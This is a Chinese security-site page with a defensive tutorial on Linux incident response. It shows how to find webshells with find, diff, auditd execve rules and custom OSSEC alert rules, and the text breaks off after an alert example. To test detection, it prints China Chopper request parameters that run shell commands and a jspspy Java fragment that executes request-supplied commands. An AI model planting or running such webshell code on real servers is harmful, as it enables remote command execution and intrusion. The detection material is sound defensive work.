<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】Linux应急响应姿势浅谈 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="linux,应急响应"/>
    
        <meta name="description" content="本文从Web服务、SSH服务、进程、网络连接、敏感目录、history、开机启动项、定时任务、rootkit、权限等方面介绍了应急响应的各种姿势，含大量运维人员需掌握的linux命令。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】Linux应急响应姿势浅谈</h2>
                <div class="article-msg">
                    <span class="time">2017-09-26 14:00:19</span>
                                        <span class="read">阅读：10053次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4481"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4481" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://xianzhi.aliyun.com/forum/read/2150.html"
                             target="_blank">来源： 阿里云先知</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><img src="http://p3.qhimg.com/t019d8b79a19cc7d8ab.png" title="t019d8b79a19cc7d8ab.png" alt="http://p7.qhimg.com/t019d8b79a19cc7d8ab.png"/></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>作者：vinc@阿里云先知</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">一、前记</span></strong></span><br/></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">无论是甲方还是乙方的同学，应急响应可能都是家常便饭，你可能经常收到如下反馈：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运维同事 --&gt; 服务器上存在<strong>可疑进程</strong>，系统资源占用高；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">网络同事 --&gt; 监控发现某台服务器<strong>对外大量发包</strong>；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">....</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不要着急，喝一杯82年的美年达压压惊，希望本文可以对你有所帮助。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、排查流程</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x01 Web服务</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一般如果网络边界做好控制，<strong>通常对外开放的仅是Web服务</strong>，那么需要先找到Webshell，可以通过如下途径：</span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）检查最近创建的php、jsp文件和上传目录</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如要查找24小时内被修改的JSP文件：</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;find&nbsp;./&nbsp;-mtime&nbsp;0&nbsp;-name&nbsp;&quot;*.jsp&quot;</pre><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）使用Webshell查杀工具</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"> &nbsp; &nbsp;Windows下D盾等，Linux下河马等。</span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3）与测试环境目录做对比</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&gt; diff -r {生产dir} {测试dir}</span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4）创建Audit审计规则</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">vim&nbsp;/etc/audit/audit.rules
-a&nbsp;exclude,always&nbsp;-F&nbsp;msgtype=CONFIG_CHANGE
-a&nbsp;exit,always&nbsp;-F&nbsp;arch=b64&nbsp;-F&nbsp;uid=48&nbsp;-S&nbsp;execve&nbsp;-k&nbsp;webshell</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">产生日志如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">type=SYSCALL&nbsp;msg=audit(1505888691.301:898615):&nbsp;arch=c000003e&nbsp;syscall=59&nbsp;success=yes&nbsp;exit=0&nbsp;a0=ca5188&nbsp;a1=cb5ec8&nbsp;a2=cb5008&nbsp;a3=8&nbsp;items=2&nbsp;ppid=26159&nbsp;pid=26160&nbsp;auid=0&nbsp;uid=48&nbsp;gid=48&nbsp;euid=48&nbsp;suid=48&nbsp;fsuid=48&nbsp;egid=48&nbsp;sgid=48&nbsp;fsgid=48&nbsp;tty=(none)&nbsp;ses=120028&nbsp;comm=&quot;ls&quot;&nbsp;exe=&quot;/bin/ls&quot;&nbsp;subj=unconfined_u:system_r:httpd_t:s0&nbsp;key=&quot;webshell&quot;
type=EXECVE&nbsp;msg=audit(1505888691.301:898615):&nbsp;argc=1&nbsp;a0=&quot;ls&quot;
type=CWD&nbsp;msg=audit(1505888691.301:898615):&nbsp;cwd=&quot;/var/www/html/dvwa&quot;
type=PATH&nbsp;msg=audit(1505888691.301:898615):&nbsp;item=0&nbsp;name=&quot;/bin/ls&quot;&nbsp;inode=2359385&nbsp;dev=fd:00&nbsp;mode=0100755&nbsp;ouid=0&nbsp;ogid=0&nbsp;rdev=00:00&nbsp;obj=system_u:object_r:bin_t:s0&nbsp;nametype=NORMAL
type=PATH&nbsp;msg=audit(1505888691.301:898615):&nbsp;item=1&nbsp;name=(null)&nbsp;inode=1441842&nbsp;dev=fd:00&nbsp;mode=0100755&nbsp;ouid=0&nbsp;ogid=0&nbsp;rdev=00:00&nbsp;obj=system_u:object_r:ld_so_t:s0&nbsp;nametype=NORMAL</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到所在目录为<strong>/var/www/html/dvwa</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">具体Auditd的使用如下：</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Auditd服务介绍</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Auditd服务是Linux自带的审计系统，用来记录审计信息，从安全的角度可以用于对系统安全事件的监控。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Auditd服务的配置文件位于<strong>/etc/audit/audit.rules</strong>，其中每个规则和观察器必须单独在一行中。语法如下：</span></p><pre class="brush:bash;toolbar:false">-a&nbsp;&lt;list&gt;,&lt;action&gt;&nbsp;&lt;options&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&lt;list&gt;配置如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">task
每个任务的列表。只有当创建任务时才使用。只有在创建时就已知的字段(比如UID)才可以用在这个列表中。
entry
系统调用条目列表。当进入系统调用确定是否应创建审计时使用。
exit
系统调用退出列表。当退出系统调用以确定是否应创建审计时使用。
user
用户消息过滤器列表。内核在将用户空间事件传递给审计守护进程之前使用这个列表过滤用户空间事件。有效的字段只有uid、auid、gid和pid。
exclude
事件类型排除过滤器列表。用于过滤管理员不想看到的事件。用msgtype字段指定您不想记录到日志中的消息。</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&lt;action&gt;配置如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><pre class="brush:bash;toolbar:false">never
不生成审计记录。
always
分配审计上下文，总是把它填充在系统调用条目中，总是在系统调用退出时写一个审计记录。如果程序使用了这个系统调用，则开始一个审计记录。</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&lt;options&gt;配置如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">-S&nbsp;&lt;syscall&gt;
根据名称或数字指定一个系统。要指定所有系统调用，可使用all作为系统调用名称。
-F&nbsp;&lt;name[=,!=,&lt;,&gt;,&lt;=]value&gt;
指定一个规则字段。如果为一个规则指定了多个字段，则只有所有字段都为真才能启动一个审计记录。每个规则都必须用-F启动，最多可以指定64个规则。</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">常用的字段如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">pid
进程ID。
ppid
父进程的进程ID。
uid
用户ID。
gid
组ID。
msgtype
消息类型号。只应用在排除过滤器列表上。
arch
系统调用的处理器体系结构。指定精确的体系结构，比如i686(可以通过uname&nbsp;-m命令检索)或者指定b32来使用32位系统调用表，或指定b64来使用64位系统调用表。
...</pre><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">编写测试Java命令监控规则</span></strong></span><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Jboss的启动账户为nobody，添加审计规则</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">#&nbsp;grep&nbsp;&#39;\-a&#39;&nbsp;/etc/audit/audit.rules&nbsp;
-a&nbsp;exclude,always&nbsp;-F&nbsp;msgtype=CONFIG_CHANGE
-a&nbsp;exit,always&nbsp;-F&nbsp;arch=b32&nbsp;-F&nbsp;uid=99&nbsp;-S&nbsp;execve&nbsp;-k&nbsp;webshell</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">重启服务</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">#&nbsp;service&nbsp;auditd&nbsp;restart
Stopping&nbsp;auditd:&nbsp;[&nbsp;OK&nbsp;]
Starting&nbsp;auditd:&nbsp;[&nbsp;OK&nbsp;]</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">使用webshell测试：</span></strong></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">1）菜刀马测试</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">菜刀马传递的参数为</span></p><pre class="brush:plain;toolbar:false">tom=M&amp;z0=GB2312&amp;z1=-c/bin/sh&amp;z2=cd&nbsp;/;whoami;echo&nbsp;[S];pwd;echo&nbsp;[E]</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">所执行的程序如下：</span></p><pre class="brush:plain;toolbar:false">else&nbsp;if(Z.equals(&quot;M&quot;)){String[]&nbsp;c={z1.substring(2),z1.substring(0,2),z2};Process&nbsp;p=Runtime.getRuntime().exec(c);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">审计日志如下：</span></p><pre class="brush:plain;toolbar:false">type=EXECVE&nbsp;msg=audit(1500273887.809:7496):&nbsp;argc=3&nbsp;a0=&quot;/bin/sh&quot;&nbsp;a1=&quot;-c&quot;&nbsp;a2=6364202F7765622F70726F6A6563742F7A616F6A69617379732E6A69616E73686539392E636F6D2E636563616F707379732F636563616F707379732F3B77686F616D693B6563686F205B535D3B7077643B6563686F205B455D</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);">2）jspspy测试</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">jspspy传递的参数为</span></p><pre class="brush:plain;toolbar:false">o=shell&amp;type=command&amp;command=netstat+-antlp&amp;submit=Execute</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">所执行的程序如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:java;toolbar:false">String&nbsp;type&nbsp;=&nbsp;request.getParameter(&quot;type&quot;);
if&nbsp;(type.equals(&quot;command&quot;))&nbsp;{
ins.get(&quot;vs&quot;).invoke(request,response,JSession);
out.println(&quot;&lt;div&nbsp;style=&#39;margin:10px&#39;&gt;&lt;hr/&gt;&quot;);
out.println(&quot;&lt;pre&gt;&quot;);
String&nbsp;command&nbsp;=&nbsp;request.getParameter(&quot;command&quot;);
if&nbsp;(!Util.isEmpty(command))&nbsp;{
Process&nbsp;pro&nbsp;=&nbsp;Runtime.getRuntime().exec(command);
BufferedReader&nbsp;reader&nbsp;=&nbsp;new&nbsp;BufferedReader(new&nbsp;InputStreamReader(pro.getInputStream()));
String&nbsp;s&nbsp;=&nbsp;reader.readLine();</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">审计日志如下：</span></p><pre class="brush:plain;toolbar:false">type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">OSSEC监控配置</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">OSSEC本身已经包含了auditd事件的解码规则，例如：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:xml;toolbar:false">&lt;decoder&nbsp;name=&quot;auditd&quot;&gt;
&nbsp;&nbsp;&lt;prematch&gt;^type=&lt;/prematch&gt;
&lt;/decoder&gt;
.......</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">但是在RULES里面没有找到现成的规则，编辑local_rules.xml，新增</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:xml;toolbar:false">&lt;group&nbsp;name=&quot;syslog,auditd,&quot;&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110000&quot;&nbsp;level=&quot;0&quot;&nbsp;noalert=&quot;1&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;decoded_as&gt;auditd&lt;/decoded_as&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;AUDITD&nbsp;messages&nbsp;grouped.&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110001&quot;&nbsp;level=&quot;10&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;match&gt;EXECVE&lt;/match&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;command&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&lt;/group&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;ossec]#&nbsp;./bin/ossec-logtest&nbsp;
2017/07/17&nbsp;16:28:26&nbsp;ossec-testrule:&nbsp;INFO:&nbsp;Reading&nbsp;local&nbsp;decoder&nbsp;file.
2017/07/17&nbsp;16:28:26&nbsp;ossec-testrule:&nbsp;INFO:&nbsp;Started&nbsp;(pid:&nbsp;9463).
ossec-testrule:&nbsp;Type&nbsp;one&nbsp;log&nbsp;per&nbsp;line.
type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;
**Phase&nbsp;1:&nbsp;Completed&nbsp;pre-decoding.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;full&nbsp;event:&nbsp;&#39;type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hostname:&nbsp;&#39;localhost&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;program_name:&nbsp;&#39;(null)&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log:&nbsp;&#39;type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;&#39;
**Phase&nbsp;2:&nbsp;Completed&nbsp;decoding.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;decoder:&nbsp;&#39;auditd&#39;
**Phase&nbsp;3:&nbsp;Completed&nbsp;filtering&nbsp;(rules).
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rule&nbsp;id:&nbsp;&#39;110001&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Level:&nbsp;&#39;10&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description:&nbsp;&#39;Java&nbsp;execution&nbsp;command&#39;
**Alert&nbsp;to&nbsp;be&nbsp;generated.</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后在Agent端添加监控文件</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:xml;toolbar:false">&nbsp;&nbsp;&lt;localfile&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;log_format&gt;syslog&lt;/log_format&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
&nbsp;&nbsp;&lt;/localfile&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后jspspy执行系统命令，可以看到告警如下</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;ossec]#&nbsp;tail&nbsp;-f&nbsp;/var/ossec/logs/alerts/alerts.log&nbsp;
**&nbsp;Alert&nbsp;1500280231.400419:&nbsp;mail&nbsp;&nbsp;-&nbsp;syslog,auditd,
2017&nbsp;Jul&nbsp;17&nbsp;16:30:31&nbsp;(agent-31)&nbsp;10.110.1.31-&gt;/var/log/audit/audit.log
Rule:&nbsp;110001&nbsp;(level&nbsp;10)&nbsp;-&gt;&nbsp;&#39;Java&nbsp;execution&nbsp;command&#39;
